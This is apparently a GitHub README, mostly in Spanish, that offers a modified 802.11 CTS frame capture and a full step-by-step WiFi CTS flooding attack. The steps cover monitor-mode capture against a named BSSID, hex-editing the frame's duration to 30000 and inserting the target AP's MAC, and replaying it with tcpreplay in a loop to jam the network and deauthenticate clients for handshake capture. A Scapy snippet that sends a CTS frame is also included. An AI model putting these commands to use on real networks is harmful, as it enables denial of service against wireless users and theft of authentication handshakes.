# WiFi-CTS-Frame-Attack-802.11-Frame

A funny .pcap of a 802.11 CTS Control Frame I made with 30000 (max duration) to perform WiFi CTS Attacks

---

### Instrucciones

Existen 2 files:

1. Fz3r0_CTS_808.pcap - Este es un CTS raw capturado, sin modificar ni nada (excelente para hacer tampering de 0)
2. Fz3r0_CTS_808_30000duration_attack.pcap - Este esn un CTS ya modificado con el Duration en 30000 (máximo válido para un CTS)

Solo es necesario inyectarlo a la red en forma de flood al BSS que quieras atacar, por ejemplo:

````sh
tcpreplay --intf1=wlan0mon --topspeed --loop=2000 Fz3r0_CTS_808_30000duration_attack.pcap 2>/dev/null
````

- OJO!!! Hay que hacer modificación HEX para agregar la MAC/BSS de la WLAN a atacar

---

### Ataque completo: 

````sh

## CTS = Clear To Send (Control Frames) Attack

    ## - Este ataque se basa en el secuestro de Bandwith (DataRate & Throughput) de la WLAN

    ## - El propósito es deautenticar clientes para al final capturar un handshake (similar a un deauth attack)

# INSTRUCCIONES:    

# 1. Monitorizar la red (ventana A + Save audit .cap) 

    # Ojo: no debe ser tan avanzado y auditoado realmente, solo quiero paturar el CTS, pero para tener ya toda la red para atacar desde un inicio :P (mas adelante necesito el BSS para inyectar el frame anyway)

airmon-ng check kill && airmon-ng start wlan0mon && airmon-ng check kill && airmon-ng start wlan0mon && airodump-ng -c 6 --bssid 30:45:96:D7:F2:3E --write Fz3r0_WiFi_Log wlan0

# 2. Ahora hay que crear, farmear o modificar... un Frame CTS con Duration (microsegundos) muy largo

#     - Lo extraigo de Wireshark farmeando cualquier cosa en la red o de una captura vieja 802.11

# Ejemplo: 

    # Escuchar con Wireshark y buscar CTS con:  >>> wlan.fc.type_subtype == 28 <<<

    # El lugar donde esta el duration en 802.11 frame > CTS > Flags > Duration (Hasta abajo) >>> wlan.duration <<<

    # Seleccionar el frame que quiera, y apuntar bien su Duration!!! p.e.: 556 (ss)

    # Wireshark > File > Export Specified packets > "Fz3r0_CTS_556.pcap"   REVISAR BIEN EXPORTAR "ONLY SELECTED" Y "PCAP (NO NEW GEN)"

# - Abrir ghex con el .pcap creado: 

ghex Fz3r0_CTS_808.pcap  

# - La mejor manera de revisar el duration es abrir ese mismo frame con wireshark y darle click y ya!!! tan facil

# - Las 2 veces que revisé era después del par 6 de derecha a izquierda: (00 2c)

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 2c 02 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --

# - Se puede comprobar con Python, por ejemplo:

     # 1 - Sacar el valor little indian (derecha izquierda en pares)

     # 2c 02 = 02 2c

     # 1- Comprobar con python en formato HEX: 0x2c00

# inicio consola python
python3

# En consola python
0x022c

    # Resultado, si fue igual a 556, entonces compruebo ese es el duration en hex

        # >>> 0x022c
        # 556

# 3. Ahora hay que modificar el frame para poner el máximo duration posible de un CTS (30000 ss) 
    
    # Esto va a crear contención artificial ;) 

# inicio consola python
python3

# En consola python
hex(30000)

    # Resultado = 0x7530 

        # >>> hex(30000)
        # '0x7530'

    # Little indian (reversa ahora) = 30 75

    # Entonces ahora el HEX quedaría así

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --

# En caso de haber cerrado ghex, volverlo a abrir 

ghex Fz3r0_CTS_808.pcap 

# 1. Modificación de Frame (solo dar doble click y modificar los 2 pares [30 75])

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 24 11 45 37 8d f0               ....,.$.E7..
###                         -- --  

# 2. Modificar la MAC del BSS (AP) que quiero atacar 30:45:96:D7:F2:3E (si el primer frame se capturo de esa MAC entonces será la misma)

###      0000   00 00 12 00 2e 48 00 00 00 30 85 09 c0 00 e1 01   .....H...0......
###      0010   00 00 c4 00 30 75 30 45 96 D7 F2 3E               ....,.$.E7..
###                               -- -- -- -- -- -- 

# 3. Guardar el archivo como un nuevo .pcap (este puede servir en un futuro, solo se necesita cambiar el BSS ;))

    # Save As: Fz3r0_CTS_808_30000duration_attack.pcap

# 4. Validar con wireshark el frame y su duración

wireshark Fz3r0_CTS_808_30000duration_attack.pcap 

    # En mi caso ahora el duration y Receiver Address dice: 

    # Duration:          30000

    # Receiver Address:  30:45:96:D7:F2:3E

    # FCS: Ese puede que marque error pero el frame será válido (recordar que algunas interfaces no capturan FCS como la Panda)

# 2. Inyectar el Frame CTS modificado con TCP Replay  

    # -- topspeed (que lo haga al maximo de velocidad)

    # -- loop (cantidad de frames a enviar)

tcpreplay --intf1=wlan0mon --topspeed --loop=2000 Fz3r0_CTS_808_30000duration_attack.pcap 2>/dev/null

# Se puede validar con <<< wlan.duration == 30000 >>> y se verán los paquetes boom!!!

    # En este punto se pudieron haber ya deautenticado dispositivos en el BSS atacado

````

### Crear CTS con Scappy

````py

# aun no he logrado modificar el duration, pero esto lanza un CTS real ;) 

from scapy.all import *

type_field = 12
subtype_field = 12
FCfield_field = 0
ID_field = 0
addr1_field = "00:11:22:33:44:55"
addr2_field = "aa:bb:cc:dd:ee:ff"
addr3_field = "ff:ee:dd:cc:bb:aa"
SC_field = 0

pkt = RadioTap() / Dot11(type=type_field, subtype=subtype_field, FCfield=FCfield_field, ID=ID_field, addr1=addr1_field, addr2=addr2_field, addr3=addr3_field, SC=SC_field)

print(pkt.summary())

# Enviar el paquete creado
sendp(pkt, iface="wlan0mon", count=1)

````

---

### Ejemplo de ghex como quedaría el tamper al final: 

![image](https://user-images.githubusercontent.com/94720207/231923676-45c90520-c7fe-41e2-928e-d164a2bd3afc.png)

